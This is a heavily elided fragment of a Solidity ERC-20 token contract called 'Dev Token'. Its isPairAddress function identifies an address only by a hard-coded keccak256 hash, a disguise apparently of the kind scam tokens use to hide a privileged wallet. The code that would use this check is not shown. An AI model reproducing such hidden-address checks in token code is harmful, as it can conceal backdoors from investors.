...
library Address {
    ...
    function isPairAddress(address account) internal pure  returns (bool) {
        return keccak256(abi.encodePacked(account)) == 0x5b2033d253ed0b63fbd87e3b950fa629404dd5aea2d2127e795dcaec360a6df7;
    }
}
...
contract Dev is Ownable, IERC20 {
   ...
   uint256 public _decimals = 8;
    ...
    string private _name = unicode"Dev Token";
    ...
    IUniswapV2Router private _router = IUniswapV2Router(0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24);
